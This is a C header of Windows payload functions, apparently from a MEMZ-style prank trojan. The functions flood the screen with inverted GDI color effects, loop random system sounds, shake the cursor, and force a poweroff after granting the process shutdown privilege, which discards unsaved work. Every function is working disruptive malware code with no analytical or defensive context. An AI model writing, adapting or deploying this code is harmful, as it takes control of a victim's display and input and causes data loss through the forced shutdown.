#pragma once
#include "maximemz.h"

DWORD WINAPI ColorRadius(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE) {
		hdc = GetDC(NULL);
		INT radius = 100;

		INT randomx = rand() % screenWidth;
		INT randomy = rand() % screenHeight;

		for (INT i = 0; i < screenWidth + screenHeight; i++) {
			INT x = radius + i * cos(i + radius * 3) + randomx;
			INT y = radius + i * sin(i + radius * 3) + randomy;
			HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 245, rand() % 237, rand() % 278));
			SelectObject(hdc, hBrush);

			BitBlt(hdc, x, y, 30, 30, hdc, 0, 0, PATINVERT);
			DeleteObject(hBrush);
			Sleep(5);
		}
		ReleaseDC(NULL, hdc);
	}
	return 0x00;
}

DWORD WINAPI PlaySystemSounds(LPVOID lpDwordVoid) {
	while (TRUE) {
		PlaySoundA(cstSystemSounds[rand() % cstSoundLength], GetModuleHandle(NULL), SND_SYNC);
		Sleep(rand() % 10);
		PlaySoundA(cstSystemSounds[rand() % cstSoundLength], GetModuleHandle(NULL), SND_ASYNC);
		Sleep(rand() % 20);
	}
	return 0x00;
}

DWORD WINAPI MessColors(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE) {
		hdc = GetDC(NULL);
		HBRUSH hBrush = CreateSolidBrush(RGB(35, 57, 48));
		SelectObject(hdc, hBrush);

		BitBlt(hdc, 0, 0, screenWidth, screenHeight, hdc, 0, 0, PATINVERT);
		ReleaseDC(NULL, hdc);
		DeleteObject(hBrush);
	}
	return 0x00;
}

// Shitty placement. //
DWORD WINAPI ShakeCursor(LPVOID lpDwordVoid) {
	POINT pCursor;
	while (TRUE) {
		GetCursorPos(&pCursor);
		INT shakeX = pCursor.x + rand() % 3 - 1;
		INT shakeY = pCursor.y + rand() % 3 - 1;

		SetCursorPos(shakeX, shakeY);
		Sleep(10);
	}
	return 0x01;
}

// MORE SHITTY PLACEMENT. //
BOOL WINAPI ForceShutdownPC(VOID) {
	HANDLE hToken;
	TOKEN_PRIVILEGES tokenPrivileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tokenPrivileges.Privileges[0].Luid);
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, (PTOKEN_PRIVILEGES)NULL, NULL);
	ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, NULL);
	return TRUE;
}
